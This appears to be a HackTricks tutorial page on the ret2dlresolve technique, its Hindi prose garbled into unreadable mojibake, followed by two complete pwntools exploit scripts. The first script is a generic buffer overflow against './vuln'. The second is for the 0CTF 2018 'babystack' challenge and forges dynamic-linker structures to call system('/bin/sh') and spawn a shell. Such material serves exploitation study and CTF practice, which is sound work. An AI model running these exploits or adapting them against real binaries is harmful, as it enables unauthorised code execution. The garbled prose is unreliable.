# Ret2dlresolve

<details>

<summary><strong>рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## рдореМрд▓рд┐рдХ рдЬрд╛рдирдХрд╛рд░реА

[**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) рдФрд░ [**Relro**](../common-binary-protections-and-bypasses/relro.md) рдХреЗ рдкреЗрдЬ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдкреВрд░реНрдг Relro рдХреЗ рдмрд┐рдирд░реА рд╕рд┐рдореНрдмреЛрд▓реНрд╕ (рдЬреИрд╕реЗ рдмрд╛рд╣рд░реА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЗ рдкрддреЗ) рдХреЛ рдкрд╣рд▓реА рдмрд╛рд░ рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЙрдиреНрд╣реЗрдВ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдпрд╣ рд╕рдорд╛рдзрд╛рди **`_dl_runtime_resolve`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдХрд░ рд╣реЛрддрд╛ рд╣реИред

**`_dl_runtime_resolve`** рдлрд╝рдВрдХреНрд╢рди рд╕реНрдЯреИрдХ рд╕реЗ рдХреБрдЫ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЛ рд▓реЗрддрд╛ рд╣реИ рдЬрд┐рдирдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЙрд╕ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рд┐рдореНрдмрд▓ рдХреЛ **рд╣рд▓** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЗрд╕рд▓рд┐рдП, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рд╕рднреА рдЗрди рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЛ рдирдХрд▓реА рдмрдирд╛рдпрд╛ рдЬрд╛рдП** рддрд╛рдХрд┐ рдбрд╛рдпрдирд╛рдорд┐рдХ рд▓рд┐рдВрдХ рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдзрд┐рдд рд╕рд┐рдореНрдмрд▓ (рдЬреИрд╕реЗ **`system`** рдлрд╝рдВрдХреНрд╢рди) рдХреЛ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рдЗрд╕реЗ рдПрдХ рд╡рд┐рдиреНрдпрд╛рд╕рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`system('/bin/sh')`**) рдХреЗ рд╕рд╛рде рдмреБрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рд╕рд╛рдорд╛рдиреНрдпрдд: рдпреЗ рд╕рднреА рд╕рдВрд░рдЪрдирд╛рдПрдБ рдПрдХ **рдкрд╣рд▓реА ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдмрдирд╛рдХрд░ рдирдХрд▓реА рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИрдВ рдЬреЛ рдПрдХ рд▓рд┐рдЦрдиреЗ рдХреЛ рдмреБрд▓рд╛рддреА рд╣реИ**, рдлрд┐рд░ **рд╕рдВрд░рдЪрдирд╛рдПрдБ** рдФрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ **`'/bin/sh'`** рдкрд╛рд░рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдПрдХ рдЬрд╛рдиреЗ рдорд╛рдиреЗ рд╕реНрдерд╛рди рдкрд░ рд░реАрдб рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдП рдЬрд╛рдПрдВ, рдФрд░ рдлрд┐рд░ ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ **`_dl_runtime_resolve`** рдХреЛ рдмреБрд▓рд╛рдХрд░ рдЬрд╛рд░реА рд░рдЦрддреА рд╣реИ, рдЬрд┐рд╕реЗ рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`system`** рдХреЗ рдкрддреЗ рдХреЛ рдирдХрд▓реА рд╕рдВрд░рдЪрдирд╛рдУрдВ рдореЗрдВ рд╣рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдЗрд╕ рдкрддреЗ рдХреЛ рджреНрд╡рд╛рд░рд╛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдЗрд╕ рдкрддреЗ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред

{% hint style="success" %}
рдпрд╣ рддрдХрдиреАрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИ рдпрджрд┐ syscall рдЧреИрдЬреЗрдЯреНрд╕ рдирд╣реАрдВ рд╣реИрдВ (рдЬреИрд╕реЗ [**ret2syscall**](rop-syscall-execv/) рдЬреИрд╕реА рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП) рдФрд░ libc рдкрддреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдирд╣реАрдВ рд╣реИрдВред
{% endhint %}

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдмреЗрд╣рддрд░ рд╕рдордЭ рджреВрд╕рд░реЗ рднрд╛рдЧ рдореЗрдВ рд╡реАрдбрд┐рдпреЛ рдореЗрдВ рдорд┐рд▓реЗрдЧреА:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## рд╕рдВрд░рдЪрдирд╛рдПрдБ

**`JMPREL`**, **`STRTAB`** рдФрд░ **`SYMTAB`** рддреАрди рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЛ рдирдХрд▓реА рдмрдирд╛рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред рдЖрдкрдХреЛ рдпрд╣рд╛рдВ [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures) рдореЗрдВ рдЗрдирдХрд╛ рдХреИрд╕реЗ рдирд┐рд░реНрдорд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдмреЗрд╣рддрд░ рд╕рдордЭ рд╣реИред

## рд╣рдорд▓реЗ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢

1. рдХрд┐рд╕реА рд╕реНрдерд╛рди рдкрд░ рдирдХрд▓реА рд╕рдВрд░рдЪрдирд╛рдПрдБ рд▓рд┐рдЦреЗрдВ
2. рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкрд╣рд▓реЗ рддрд░реНрдХ рдХреЛ рд╕реЗрдЯ рдХрд░реЗрдВ (`$rdi = &'/bin/sh'`)
3. рд╕реНрдЯреИрдХ рдкрд░ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЗ рдкрддреЗ рд╕реЗрдЯ рдХрд░реЗрдВ рддрд╛рдХрд┐ **`_dl_runtime_resolve`** рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ
4. **`_dl_runtime_resolve`** рдХреЛ **рдХреЙрд▓** рдХрд░реЗрдВ
5. **`system`** рд╣рд▓ рд╣реЛрдЧрд╛ рдФрд░ `'/bin/sh'` рдХреЗ рд╕рд╛рде рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛

## рдЙрджрд╛рд╣рд░рдг

### рдкреНрдпреЛрд░ Pwntools

рдЖрдк рдПрдХ [**рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдпрд╣рд╛рдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **рдЬрд┐рд╕рдореЗрдВ рдЕрдВрддрд┐рдо ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреА рдмрд╣реБрдд рдЕрдЪреНрдЫреА рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг рд╣реИ**, рд▓реЗрдХрд┐рди рдпрд╣рд╛рдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЕрдВрддрд┐рдо рдЙрддреНрдкрд╛рдж рд╣реИ:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
### рдХрдЪреНрдЪрд╛
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/0ctf18_babystack/index.html
# This exploit is based off of: https://github.com/sajjadium/ctf-writeups/tree/master/0CTFQuals/2018/babystack

from pwn import *

target = process('./babystack')
#gdb.attach(target)

elf = ELF('babystack')

# Establish starts of various sections
bss = 0x804a020

dynstr = 0x804822c

dynsym = 0x80481cc

relplt = 0x80482b0

# Establish two functions

scanInput = p32(0x804843b)
resolve = p32(0x80482f0) #dlresolve address

# Establish size of second payload

payload1_size = 43

# Our first scan
# This will call read to scan in our fake entries into the plt
# Then return back to scanInput to re-exploit the bug

payload0 = ""

payload0 += "0"*44                        # Filler from start of input to return address
payload0 += p32(elf.symbols['read'])    # Return read
payload0 += scanInput                    # After the read call, return to scan input
payload0 += p32(0)                        # Read via stdin
payload0 += p32(bss)                    # Scan into the start of the bss
payload0 += p32(payload1_size)            # How much data to scan in

target.send(payload0)

# Our second scan
# This will be scanned into the start of the bss
# It will contain the fake entries for our ret_2_dl_resolve attack

# Calculate the r_info value
# It will provide an index to our dynsym entry
dynsym_offset = ((bss + 0xc) - dynsym) / 0x10
r_info = (dynsym_offset << 8) | 0x7

# Calculate the offset from the start of dynstr section to our dynstr entry
dynstr_index = (bss + 28) - dynstr

paylaod1 = ""

# Our .rel.plt entry
paylaod1 += p32(elf.got['alarm'])
paylaod1 += p32(r_info)

# Empty
paylaod1 += p32(0x0)

# Our dynsm entry
paylaod1 += p32(dynstr_index)
paylaod1 += p32(0xde)*3

# Our dynstr entry
paylaod1 += "system\x00"

# Store "/bin/sh" here so we can have a pointer ot it
paylaod1 += "/bin/sh\x00"

target.send(paylaod1)

# Our third scan, which will execute the ret_2_dl_resolve
# This will just call 0x80482f0, which is responsible for calling the functions for resolving
# We will pass it the `.rel.plt` index for our fake entry
# As well as the arguments for system

# Calculate address of "/bin/sh"
binsh_bss_address = bss + 35

# Calculate the .rel.plt offset
ret_plt_offset = bss - relplt


paylaod2 = ""

paylaod2 += "0"*44
paylaod2 += resolve                 # 0x80482f0
paylaod2 += p32(ret_plt_offset)        # .rel.plt offset
paylaod2 += p32(0xdeadbeef)            # The next return address after 0x80482f0, really doesn't matter for us
paylaod2 += p32(binsh_bss_address)    # Our argument, address of "/bin/sh"

target.send(paylaod2)

# Enjoy the shell!
target.interactive()
```
## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)
* [https://guyinatuxedo.github.io/18-ret2\_csu\_dl/0ctf18\_babystack/index.html](https://guyinatuxedo.github.io/18-ret2\_csu\_dl/0ctf18\_babystack/index.html)
* 32рдмрд┐рдЯ, рдХреЛрдИ relro рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдиреЗрд░реА рдирд╣реАрдВ, nx, рдХреЛрдИ pie рдирд╣реАрдВ, рдореВрд▓ рд╕реНрдореЙрд▓ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдФрд░ рд░рд┐рдЯрд░реНрдиред рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмреАрдУрдПрдл рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ `read` рдХреЛ рдлрд┐рд░ рд╕реЗ рдПрдХ `.bss` рд╕реЗрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдФрд░ рдПрдХ рдмрдбрд╝реЗ рд╕рд╛рдЗрдЬ рдореЗрдВ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рдореЗрдВ `dlresolve` рдлреЗрдХ рдЯреЗрдмрд▓реНрд╕ рдХреЛ рднрд░рдиреЗ рдХреЗ рд▓рд┐рдП `system` рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рд▓реМрдЯреЗрдВ рдФрд░ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдмреАрдУрдПрдл рдХреЛ рдлрд┐рд░ рд╕реЗ рдЕрдкрд╢рд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП dlresolve рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдФрд░ рдлрд┐рд░ `system('/bin/sh')` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
